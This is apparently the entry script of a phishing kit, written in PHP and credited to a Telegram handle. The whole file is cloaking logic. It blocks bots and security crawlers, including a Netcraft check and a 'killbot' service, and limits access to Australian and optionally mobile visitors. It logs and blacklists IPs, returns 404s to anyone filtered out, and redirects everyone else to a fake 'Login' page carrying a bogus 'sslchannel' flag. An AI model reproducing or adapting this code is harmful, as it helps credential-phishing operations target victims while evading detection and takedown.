<?php
// @Kr3pto on telegram
error_reporting(0);
session_start();
require "configg.php";
require "cma_assetz/einc/functions.php";
if($internal_antibot == 1){
	require "cma_assetz/old_blocker.php";
}
if($enable_killbot == 1){
	if(checkkillbot($killbot_key) == true){
		$fp = fopen("cma_assetz/einc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($mobile_lock == 1){
	require "cma_assetz/mobile_lock.php";
}
if($AU_lock == 1){
	if(onlyau() == true){
	
	}else{
		$fp = fopen("cma_assetz/einc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($external_antibot == 1){
	if(checkBot($apikey) == true){
		$fp = fopen("cma_assetz/einc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
$rand = generateRandomString(130);
require "cma_assetz/einc/visitor_log.php";
require "cma_assetz/einc/netcraft_check.php";
require "cma_assetz/einc/blacklist_lookup.php";
require "cma_assetz/einc/ip_range_check.php";
header("location:Login?sslchannel=true&sessionid=$rand");
?>